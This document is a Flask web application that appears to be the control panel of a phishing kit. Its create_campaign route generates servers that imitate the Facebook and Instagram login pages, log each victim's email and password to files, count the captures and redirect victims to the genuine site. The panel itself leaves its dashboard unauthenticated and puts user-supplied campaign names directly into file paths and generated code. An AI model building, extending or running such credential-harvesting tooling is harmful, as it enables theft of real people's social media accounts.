from flask import Flask, render_template_string, request, redirect, url_for
import hashlib
import os
import ctypes
app = Flask(__name__)
CREDENTIALS_FILE = "credentials.txt"
VALUES_FILE = "Cts_Value_master_key"
BIN_FOLDER = 'bin_d'
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()
def load_credentials():
    credentials = {}
    try:
        with open(CREDENTIALS_FILE, "r") as file:
            for line in file:
                username, hashed_password = line.strip().split(":")
                credentials[username] = hashed_password
    except FileNotFoundError:
        pass
    return credentials
def Pre_load():
    Launched_camp = str(len(os.listdir("bin_d")))
    with open("Cts_Value_master_key", "r") as Cts_val:
        Cts_Raw = Cts_val.readlines()
        Cts_Raw[0] = Launched_camp+"\n"
    with open("Cts_Value_master_key", "w") as Cts_wri:
        Cts_wri.writelines(Cts_Raw) 
def Pre_Susces():
    suscess_counter = 0
    Launched_camp = os.listdir("bin_d")
    for Buffer in Launched_camp:
        with open("bin_d/"+Buffer, "r+") as Buffer_zone:
            Buffer_init = Buffer_zone.readlines()
            Buffer_init = Buffer_init[2]
            Buffer_init = "".join(Buffer_init)
            Buffer_init = int(Buffer_init)
        with open("Recv/"+Buffer, "r+") as Recv_zone:
            Recv_init = Recv_zone.readlines()
            Recv_init = Recv_init[0]
            Recv_init = "".join(Recv_init)
            Recv_init = int(Recv_init)
        if(Buffer_init == Recv_init):
            suscess_counter += 1
        with open("Cts_Value_master_key", "r") as Cts_val:
         Cts_Raw = Cts_val.readlines()
         Cts_Raw[3] = str(suscess_counter)+"\n"
        with open("Cts_Value_master_key", "w") as Cts_wri:
         Cts_wri.writelines(Cts_Raw)
Pre_Susces()                                                          
Pre_load()              
def load_values():
    try:
        with open(VALUES_FILE, "r") as file:
            values = [line.strip().replace(',', '') for line in file.readlines()]
            return [int(value) if value.isdigit() else value for value in values]
    except FileNotFoundError:
        return [1504, 80, 284, 7842]
def save_credentials(username, password):
    with open(CREDENTIALS_FILE, "a") as Cred_point:
        Cred_point.write(f"{username}:{hash_password(password)}\n")
# Routes \\Vuln /dashboard fix dndnd
@app.route('/')
def home():
    return render_template_string('''
        <html>
        <head>
            <title>Login Page</title>
            <style>
                body {
                    background-color: #000;
                    color: #fff;
                    font-family: 'Arial', sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    text-align: center;
                    padding: 20px;
                    border-radius: 10px;
                    background-color: #111;
                    box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
                    width: 300px;
                }
                input, button {
                    padding: 10px;
                    margin: 10px;
                    width: 80%;
                    border: 1px solid #fff;
                    border-radius: 5px;
                    background-color: #222;
                    color: #fff;
                    transition: all 0.3s ease-in-out;
                }
                button:hover {
                    background-color: #fff;
                    color: #000;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Login</h1>
                <form action="/login" method="post">
                    <input type="text" name="username" placeholder="Username" required><br>
                    <input type="password" name="password" placeholder="Password" required><br>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
    ''')
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    credentials = load_credentials()

    if username in credentials and credentials[username] == hash_password(password):
        return redirect(url_for('dashboard'))
    else:
        return render_template_string('''
            <html>
            <head>
                <title>Login Failed</title>
                <style>
                    body {
                        background-color: #000;
                        color: #fff;
                        font-family: 'Arial', sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                    }
                    .container {
                        text-align: center;
                        background-color: #111;
                        padding: 30px;
                        border-radius: 10px;
                        box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
                    }
                    a {
                        color: #0af;
                        text-decoration: none;
                        display: inline-block;
                        margin-top: 20px;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>Login Failed</h2>
                    <p>Invalid username or password.</p>
                    <a href="{{ url_for('home') }}">Try Again</a>
                </div>
            </body>
            </html>
        ''')

@app.route('/dashboard')
def dashboard():
    values = load_values()
    campaigns = os.listdir(BIN_FOLDER)
    
    return render_template_string('''
        <html>
        <head>
            <title>Dashboard</title>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
            <style>
                body {
                    font-family: 'Arial', sans-serif;
                    margin: 0;
                    background-color: #000;
                    color: #fff;
                }
                .sidebar {
                    position: fixed;
                    left: 0;
                    top: 0;
                    height: 100%;
                    width: 220px;
                    background-color: #111;
                    display: flex;
                    flex-direction: column;
                    padding-top: 20px;
                }
                .sidebar button {
                    background-color: transparent;
                    color: white;
                    border: none;
                    padding: 15px;
                    text-align: left;
                    width: 100%;
                    cursor: pointer;
                    transition: 0.3s;
                }
                .sidebar button:hover {
                    background-color: rgba(255, 255, 255, 0.2);
                }
                .container {
                    margin-left: 240px;
                    padding: 20px;
                    display: flex;
                    flex-wrap: wrap;
                    gap: 20px;
                }
                .card {
                    background-color: #111;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
                    width: 200px;
                    text-align: center;
                    opacity: 0;
                    transform: translateY(20px);
                    animation: fadeIn 0.5s forwards;
                }
                .chart-container {
                    width: 400px;
                    margin: 40px auto;
                }
                @keyframes fadeIn {
                    to {
                        opacity: 1;
                        transform: translateY(0);
                    }
                }
                .campaign-list {
                    margin-top: 20px;
                    padding-left: 20px;
                    list-style-type: none;
                    color: #fff;
                }
                .campaign-list li {
                    font-size: 12px;  /* Adjust this value to your desired font size */
                    margin: 5px 0;
                    cursor: pointer;
                    color: #fff;
                }
                .campaign-list li:hover {
                    color: #bbb;
                }
            </style>
        </head>
        <body>
            <div class="sidebar">
                <a href="{{ url_for('dashboard') }}"><button>Dashboard</button></a>
                <a href="{{ url_for('create_campaign') }}"><button>Create Campaign</button></a>
                <div>
                    <button onclick="window.location.href='{{ url_for('logout') }}'">Logout</button>
                </div>
                <style>
                    button {
                        background-color: #222;
                        color: #fff;
                        border: 1px solid #fff;
                        border-radius: 5px;
                        padding: 10px;
                        font-size: 14px;
                        cursor: pointer;
                        transition: all 0.3s ease-in-out;
                        width: 100%;
                        margin-top: 10px;
                    }

                    button:hover {
                        background-color: #fff;
                        color: #000;
                    }
                </style>
                <div>
                    <button onclick="toggleLaunch()">Launch/Start Campaign</button>
                    <div id="launchContent" style="display:none; margin-top: 10px;">
                        <ul class="campaign-list">
                            {% for campaign in campaigns %}
                                <li onclick="launchCampaign('{{ campaign }}')">{{ campaign }}</li>
                            {% endfor %}
                        </ul>
                    </div>
                </div>
                <div>
                    <button onclick="toggleBin()">Show Campaigns</button>
                    <div id="binContent" style="display:none; margin-top: 10px;">
                        <ul class="campaign-list">
                            {% for campaign in campaigns %}
                                <li onclick="window.location.href='/view_campaign/{{ campaign }}'">{{ campaign }}</li>
                            {% endfor %}
                        </ul>
                    </div>
                </div>
            </div>
            <div class="container">
                <div class="card">
                    <h2>{{ values[0] }}</h2>
                    <p>Campaign Launched</p>
                </div>
                <div class="card">
                    <h2>{{ values[1] }}</h2>
                    <p>Overall Campaign Received</p>
                </div>
                <div class="card">
                    <h2>{{ values[2] }}</h2>
                    <p>Available Campaign</p>
                </div>
                <div class="card">
                    <h2>{{ values[3] }}</h2>
                    <p>Successful Campaign</p>
                </div>
                <div class="chart-container">
                    <canvas id="statsChart"></canvas>
                </div>
            </div>
            <script>
                const ctx = document.getElementById('statsChart').getContext('2d');
                new Chart(ctx, {
                    type: 'pie',
                    data: {
                        labels: ['Campaign Launched', 'Overall Campaign Received', 'Available Campaign', 'Successful Campaign'],
                        datasets: [{
                            data: {{ values }},
                            backgroundColor: ['#fff', '#888', '#555', '#333'],
                            borderColor: '#000',
                            borderWidth: 1
                        }]
                    },
                    options: {
                        plugins: {
                            legend: {
                                labels: {
                                    color: '#fff'
                                }
                            }
                        }
                    }
                });

                function toggleBin() {
                    const binContent = document.getElementById("binContent");
                    binContent.style.display = binContent.style.display === "none" ? "block" : "none";
                }
                function toggleLaunch() {
                    const launchContent = document.getElementById("launchContent");
                    launchContent.style.display = launchContent.style.display === "none" ? "block" : "none";
    }

                function launchCampaign(campaignName) {
                    if (confirm("Are you sure you want to start the campaign: " + campaignName + "?")) {
                        fetch(`/start_campaign/${campaignName}`, { method: 'POST' })
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(err => alert("Failed to launch campaign."));
                    }
                }
                function launchCampaign(campaignName) {
                    if (confirm("Are you sure you want to start the campaign: " + campaignName + "?")) {
                        fetch(`/start_campaign/${campaignName}`, { method: 'POST' })
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(err => alert("Failed to launch campaign."));
                    }
}
                function confirmAction() {
                    const campaignName = window.confirmCampaignName;
                    if (campaignName) {
                        fetch(`/start_campaign/${campaignName}`, { method: 'POST' })
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(err => alert("Failed to launch campaign."));
                    }
                    cancelAction(); // Hide the box after confirmation
                }

                function cancelAction() {
                    document.getElementById('confirmationBox').style.display = "none"; // Hide the box if cancelled
                }
            </script>
        </body>
        </html>lic
    ''', values=values, campaigns=campaigns)
@app.route('/view_campaign/<campaign_name>')
@app.route('/view_campaign/<campaign_name>')
def view_campaign(campaign_name):
    campaign_file_path = os.path.join(BIN_FOLDER, campaign_name)
    recv_file_path = os.path.join("Recv", campaign_name)
    try:
        with open(campaign_file_path, 'r') as file:
            campaign_data = file.readlines()
    except FileNotFoundError:
        return "Campaign not found.", 404
    campaign_name = campaign_data[0].strip()
    campaign_type = campaign_data[1].strip()
    campaign_goal_str = campaign_data[2].strip()
    campaign_goal = int(campaign_goal_str.replace('Goal: ', '').strip())
    try:
        with open(recv_file_path, 'r') as recv_file:
            progress_raw = recv_file.read().strip()
            campaign_progress = int(progress_raw) if progress_raw.isdigit() else 0
    except FileNotFoundError:
        campaign_progress = 0
    remaining = max(campaign_goal - campaign_progress, 0)
    campaign_values = [campaign_goal, campaign_progress, remaining]
    return render_template_string('''
        <html>
        <head>
            <title>Campaign Details</title>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
            <style>
                body { font-family: 'Arial', sans-serif; background-color: #000; color: #fff; }
                .container { padding: 20px; }
                .button { background-color: #444; padding: 10px 20px; color: #fff; text-decoration: none; border-radius: 5px; }
                .chart-container { width: 400px; margin: 40px auto; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Campaign: {{ campaign_name }}</h1>
                <p>Type: {{ campaign_type }}</p>
                <p>Goal: {{ campaign_goal }}</p>
                <p>Progress: {{ campaign_values[1] }}</p>
                <p>Remaining: {{ campaign_values[2] }}</p>
                <div class="chart-container">
                    <canvas id="campaignChart"></canvas>
                </div>
                <a href="{{ url_for('dashboard') }}" class="button">Back to Dashboard</a>
            </div>
            <script>
                const ctx = document.getElementById('campaignChart').getContext('2d');
                new Chart(ctx, {
                    type: 'pie',
                    data: {
                        labels: ['Goal', 'Progress', 'Remaining'],
                        datasets: [{
                            data: {{ campaign_values }},
                            backgroundColor: ['#fff', '#888', '#555'],
                            borderColor: '#000',
                            borderWidth: 1
                        }]
                    },
                    options: {
                        plugins: {
                            legend: {
                                labels: {
                                    color: '#fff'
                                }
                            }
                        }
                    }
                });
            </script>
        </body>
        </html>
    ''', campaign_name=campaign_name, campaign_type=campaign_type, campaign_goal=campaign_goal, campaign_values=campaign_values)
@app.route('/create_campaign', methods=['GET', 'POST'])
def create_campaign():
    if request.method == 'POST':
        name = request.form['name']
        campaign_type = request.form['type']
        goal = request.form['goal']
        campaign_file_path = os.path.join(BIN_FOLDER, f"{name}")
        os.makedirs(BIN_FOLDER, exist_ok=True)
        with open(campaign_file_path, 'w') as file:
            file.write(f"{name}\n{campaign_type}\n{goal}\n")
        Sh_Header_tag = name    
        print(Sh_Header_tag)
        COPY_PIN_CODE = r'''from flask import Flask, render_template, request , redirect
from datetime import datetime
import random
Spatial_point = '''+ f''' 'bin_d/{Sh_Header_tag}''' + r''''
Spatial_tag = Spatial_point[6:]
with open(f"{Spatial_point}", "r") as spatial_viewing_file:
    spatial_viewing_file_raw = spatial_viewing_file.readlines()
    print(spatial_viewing_file_raw)
    if(spatial_viewing_file_raw[1] == "Facebook\n"):
        Current_New_Profile = str(random.randint(100000,1000000))
        app = Flask(__name__)
        def save_credentials(email, password):
            with open(f"credentials/{Current_New_Profile}user.txt", "+a") as file:
                file.write(f" {datetime.now()}Email: {email}, Password: {password}\n")
        @app.route("/", methods=["GET", "POST"])
        def home():
            if request.method == "POST":
                email = request.form.get("email")
                password = request.form.get("password")
                save_credentials(email, password)
                print(f"Captured Email or Username: {email}, Password: {password}")
                with open("Recv/"+Spatial_tag, "+r") as Experso_inagoma:
                     Experso_inagmoa_raw = Experso_inagoma.readlines()
                     Experso_inagmoa_cooked = "".join(Experso_inagmoa_raw)
                     if(Experso_inagmoa_cooked == ""):
                        Experso_inagmoa_cooked = 0
                     Experso_inagmoa_int = int(Experso_inagmoa_cooked)
                     Experso_inagmoa_inserto = str(Experso_inagmoa_int + 1)
                     Experso_inagoma.seek(0)
                     Experso_inagoma.truncate()
                     Experso_inagoma.writelines(Experso_inagmoa_inserto)
                return redirect("https://web.facebook.com/?_rdc=1&_rdr")
            return render_template("Fb.html")
        if __name__ == "__main__":
            app.run(debug=True, port=9995)
    if(spatial_viewing_file_raw[1] == "Instagram\n"):
        Current_New_Profile = str(random.randint(100000,1000000))
        app = Flask(__name__)
        def save_credentials(email, password):
            with open(f"credentials/{Current_New_Profile}user.txt", "+a") as file:
                file.write(f" {datetime.now()}Email: {email}, Password: {password}\n")
        @app.route("/", methods=["GET", "POST"])
        def home():
            if request.method == "POST":
                email = request.form.get("email")
                password = request.form.get("password")
                save_credentials(email, password)
                print(f"Captured Email or Username: {email}, Password: {password}")
                with open("Recv/"+Spatial_tag, "+r") as Experso_inagoma:
                     Experso_inagmoa_raw = Experso_inagoma.readlines()
                     Experso_inagmoa_cooked = "".join(Experso_inagmoa_raw)
                     if(Experso_inagmoa_cooked == ""):
                        Experso_inagmoa_cooked = 0
                     Experso_inagmoa_int = int(Experso_inagmoa_cooked)
                     Experso_inagmoa_inserto = str(Experso_inagmoa_int + 1)
                     Experso_inagoma.seek(0)
                     Experso_inagoma.truncate()
                     Experso_inagoma.writelines(Experso_inagmoa_inserto)
                return redirect("https://www.instagram.com/")
            return render_template("index.html")
        if __name__ == "__main__":
            app.run(debug=True, port=9998)
            '''
        with open(f"bin/zntp_web_server_{name}.py", "+a") as web_server_source_code:
           web_server_source_code.writelines(COPY_PIN_CODE)
        with open(f"Recv/{name}", "+a") as Recv_spin:
            Recv_spin.writelines("0")   
        return redirect(url_for('dashboard'))
    return render_template_string('''
        <html>
        <head>
            <title>Create Campaign</title>
            <style>
                body {
                    background-color: #000;
                    color: #fff;
                    font-family: 'Arial', sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    background-color: #111;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
                    width: 320px;
                    text-align: center;
                }
                input, button {
                    width: 90%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #fff;
                    border-radius: 5px;
                    background-color: #222;
                    color: #fff;
                    transition: all 0.3s ease-in-out;
                }
                button:hover {
                    background-color: #fff;
                    color: #000;
                }
                .button-link {
                    display: inline-block;
                    padding: 10px 20px;
                    background-color: #444;
                    color: #fff;
                    text-decoration: none;
                    border-radius: 5px;
                    margin-top: 20px;
                    transition: background-color 0.3s;
                }
                .button-link:hover {
                    background-color: #666;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Create Campaign</h1>
                <form method="post">
                    <input type="text" name="name" placeholder="Campaign Name" required><br>
                    <input type="text" name="type" placeholder="Campaign Type" required><br>
                    <input type="number" name="goal" placeholder="Campaign Goal" required><br>
                    <button type="submit">Create Campaign</button>
                </form>
                <a href="{{ url_for('dashboard') }}" class="button-link">Back to Dashboard</a>
            </div>
        </body>
        </html>
    ''')
@app.route('/logout')
def logout():
    return redirect(url_for('home'))    
@app.route('/start_campaign/<campaign_name>', methods=['POST'])
def start_campaign(campaign_name):
    with open("Exp_run_point", "w") as watching_dog_point:
        watching_dog_point.write(campaign_name)
    return f"Campaign '{campaign_name}' has been started!"  
if __name__ == '__main__':
    app.run(debug=True)
